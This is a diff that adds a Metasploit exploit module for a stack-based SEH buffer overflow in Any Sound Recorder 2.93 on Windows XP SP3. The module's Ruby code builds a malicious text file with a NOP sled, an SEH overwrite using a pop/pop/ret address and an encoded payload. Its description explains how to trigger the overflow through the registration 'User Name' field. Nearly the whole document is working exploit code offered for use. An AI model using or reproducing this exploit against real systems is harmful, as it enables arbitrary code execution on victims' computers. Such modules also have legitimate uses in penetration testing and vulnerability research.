@@ -1,0 +1,72 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::FILEFORMAT
+  include Msf::Exploit::Seh
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'    => 'Any Sound Recorder 2.93 Buffer Overflow (SEH)',
+      'Description'  => %q{
+          This module exploits a stack based buffer overflow in Any Sound Recorder 2.93, when
+          with the name "hack.txt". Copy the content of the  "hack.txt",Start Any Sound Recorder 2.93 click "Enter Key Code" Paste the content into field "User Name" click "Register"
+      },
+      'License'    => MSF_LICENSE,
+      'Author'    =>
+        [
+          'Abdullah Alıç',            # Original discovery
+          'd3ckx1 d3ck(at)qq.com',       # MSF module
+        ],
+      'References'  =>
+        [
+          [ 'OSVDB', '' ],
+          [ 'EBD', '45627' ]
+        ],
+      'DefaultOptions' =>
+        {
+          'EXITFUNC' => 'process'
+        },
+      'Platform'  => 'win',
+      'Payload'   =>
+        {
+          'BadChars'    => "\x00\x0a\x0d",
+          'DisableNops' => true,
+          'Space'       => 10000
+        },
+      'Targets'   =>
+        [
+          [ 'Any Sound Recorder 2.93',
+            {
+              'Ret'     =>  0x72d12f35, # 0x72d12f35 : P/P/R FROM msacm32.drv form winxp sp3
+              'Offset'  =>  900
+            }
+          ],
+        ],
+      'Privileged'  => false,
+      'DisclosureDate'  => 'Oct 25 2018',
+      'DefaultTarget'  => 0))
+
+    register_options([OptString.new('FILENAME', [ false, 'The file name.', 'msf.txt']),], self.class)
+
+  end
+
+  def exploit
+    buf = "\x90"*(target['Offset'])
+    buf << "\xeb\x06#{Rex::Text.rand_text_alpha(2, payload_badchars)}" # nseh (jmp to payload)
+    buf << [target.ret] .pack('V')  # seh
+    buf << make_nops(10)
+    buf << payload.encoded
+    buf << "\x90" * 200
+
+    file_create(buf)
+    handler
+    
+  end
+end
